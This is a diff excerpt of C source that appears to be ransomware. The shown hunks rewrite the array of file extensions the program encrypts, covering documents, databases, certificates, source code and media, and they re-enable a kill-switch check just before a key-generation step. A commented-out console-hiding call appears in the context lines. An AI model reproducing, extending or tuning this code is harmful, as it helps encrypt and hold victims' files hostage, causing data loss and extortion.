@@ -21,25 +21,16 @@
 unsigned int cant_files = 0;
 
 // Encrypt file with the next extensions:
-const char extensions[][13] = {
-  "123", "3dm", "3ds", "3g2", "3gp", "602", "accdb", "aes", "ARC", "asc", "asf",
-  "asm", "asp", "avi", "backup", "bak", "bat", "bmp", "brd", "bz2", "cgm", "class",
-  "cmd", "cpp", "crt", "csr", "csv", "dbf", "dch", "der", "dif", "dip", "djvu",
-  "doc", "docb", "docm", "docx", "dot", "dotm", "dotx", "dwg", "edb", "eml", "fla",
-  "flv", "frm", "gif", "gpg", "hwp", "ibd", "iso", "jar", "java", "jpeg", "jpg", 
-  "jsp", "key", "lay", "lay6", "ldf", "m3u", "m4u", "max", "mdb", "mdf", "mid",
-  "mkv", "mml", "mov", "mp3", "mp4", "mpeg", "mpg", "msg", "myd", "myi", "nef",
-  "odb", "odg", "odp", "ods", "odt", "onetoc2", "ost", "otg", "otp", "ots", "ott",
-  "p12", "paq", "pas", "pdf", "pem", "pfx", "php", "png", "pot", "potm", "potx",
-  "ppam", "pps", "ppsm", "ppsx", "ppt", "pptm", "pptx", "ps1", "psd", "pst", "rar",
-  "raw", "rtf", "sch", "sldm", "sldx", "slk", "sln", "snt", "sql", "sqlite3",
-  "sqlitedb", "stc", "std", "sti", "stw", "suo", "svg", "swf", "sxc", "sxd", "sxi",
-  "sxm", "sxw", "tar", "tbk", "tgz", "tif", "tiff", "txt", "uop", "uot", "vbs", "vcd",
-  "vdi", "vmdk", "vmx", "vob", "vsd", "vsdx", "wav", "wb2", "wk1", "wks", "wma", "wmv",
-  "xlc", "xlm", "xls", "xlsb", "xlsm", "xlsx", "xlt", "xltm", "xltx", "xlw", "zip"
+const char extensions[][7] = {
+  "3ds", "3gp", "7z", "asm", "avi", "backup", "bak", "bat", "bin", "bmp",
+  "cfg", "cmd", "c", "cpp", "css", "diff", "doc", "docx", "flv", "gci", "ggb",
+  "gif", "gz", "h", "htm", "html", "i3d", "ico", "inf", "ini", "ino", "iso",
+  "jar", "jpeg", "jpg", "js", "json", "m2", "md", "mkv", "mod", "mov", "mp3",
+  "mp4", "mpeg", "mpg", "log", "odt", "pas", "pdf", "php", "png", "ppt",
+  "pptx", "rar", "raw", "rtf", "rpx", "sav", "sql", "svg", "swf", "tar",
+  "txt", "vbs", "wav", "wma", "wmv", "xls", "xml", "xps", "zip"
 };
 
-// Case sensitive
 bool isValidFile(char* file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
@@ -128,7 +119,7 @@ int main() {
   //FreeConsole();
 #endif
 
-  //if (KillSwitch()) exit(EXIT_FAILURE);
+  if (KillSwitch()) exit(EXIT_FAILURE);
 
   /// GENERATE KEY
   char* id; unsigned int len;
